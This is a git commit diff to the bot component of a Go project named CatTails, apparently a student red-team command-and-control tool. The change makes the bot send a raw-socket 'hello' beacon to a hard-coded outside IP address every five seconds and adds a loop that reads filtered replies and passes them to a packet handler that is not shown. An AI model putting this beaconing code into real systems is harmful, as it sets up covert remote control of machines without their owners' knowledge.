b1d5a9d7b45436834fa5fb5f53cd78e29b5a894a
oneNutW0nder <scb5436@rit.edu>
2019-10-23 02:37:45 -0400

    send hello timer; receive logic

--- cmd/bot/bot.go
+++ cmd/bot/bot.go
@@ -4,23 +4,32 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"time"
 
 	"github.com/oneNutW0nder/CatTails/cattails"
 	"golang.org/x/sys/unix"
 )
 
 func sendHello(fd int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
-	packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
+	for {
+		packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
 
-	addr := cattails.CreateAddrStruct(iface)
+		addr := cattails.CreateAddrStruct(iface)
 
-	cattails.SendPacket(fd, iface, addr, packet)
+		cattails.SendPacket(fd, iface, addr, packet)
+		// Send hello every 5 seconds
+		time.Sleep(5 * time.Second)
+	}
 }
 
 func main() {
 
-	fd := cattails.NewSocket()
-	defer unix.Close(fd)
+	vm := cattails.CreateBPFVM(cattails.FilterRaw)
+
+	sendfd := cattails.NewSocket()
+	readfd := cattails.NewSocket()
+	defer unix.Close(sendfd)
+	defer unix.Close(readfd)
 
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
 
@@ -31,6 +40,15 @@ func main() {
 
 	fmt.Println("Sending")
 	// 18.191.209.30
-	sendHello(fd, iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
+	go sendHello(sendfd, iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
+
+	// Listen for responses
+	for {
+		packet := cattails.ReadPacket(readfd, vm)
+
+		if packet != nil {
+			go botProcessPacket(packet)
+		}
+	}
 
 }
